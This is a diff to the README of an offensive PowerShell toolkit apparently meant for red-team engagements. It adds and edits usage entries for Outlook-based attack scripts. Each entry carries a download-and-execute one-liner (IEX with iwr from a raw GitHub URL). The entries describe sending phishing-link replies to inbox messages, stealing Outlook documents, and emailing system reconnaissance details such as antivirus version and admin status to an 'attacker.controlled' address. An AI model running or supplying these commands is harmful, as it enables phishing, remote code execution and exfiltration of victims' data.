@@ -2,9 +2,21 @@
 
 A collection of offensive code used for red team engagements. 
 
+### OLRP.ps1
+```
+    Usage: powershell IEX (iwr 'https://raw.githubusercontent.com/jeffjbowie/Weaponry/master/OLRP.ps1'); ReplyP -Subject "tokens" -URL "http://training.aliasinfosec.com"
+
+    * Creates instance of Outlook COM Object
+
+    * Searches Inbox for messages sorted by newest, which contain the specified term in the subject line.
+
+    * Replies to the newest message with a personalized response containing a phishing link.
+
+```
+
 ### OutlookDocStealer.ps1
 ```
-  * Usage: powershell IEX (IWR 'https://raw.githubusercontent.com/jeffjbowie/Weaponry/master/OutlookDocStealer.ps1'); Vicious -SendTo "attacker.controlled@email.com"
+  Usage: powershell IEX (IWR 'https://raw.githubusercontent.com/jeffjbowie/Weaponry/master/OutlookDocStealer.ps1'); Vicious -SendTo "attacker.controlled@email.com"
 
   * Start new Outlook instance via COM object.
   
@@ -46,7 +58,7 @@ A collection of offensive code used for red team engagements.
 
 ### OEF.ps1
 ```
-   * Usage: powershell IEX (IWR 'https://raw.githubusercontent.com/jeffjbowie/Weaponry/master/OEF.ps1'); OEF -To "attacker.controlled@email.com"
+   Usage: powershell IEX (IWR 'https://raw.githubusercontent.com/jeffjbowie/Weaponry/master/OEF.ps1'); OEF -To "attacker.controlled@email.com"
    
    * Uses an Outlook COM object to send system information to the specified e-mail address:
          - Windows OS, A/V Version, Language, Architecture, Admin?, & External IP.
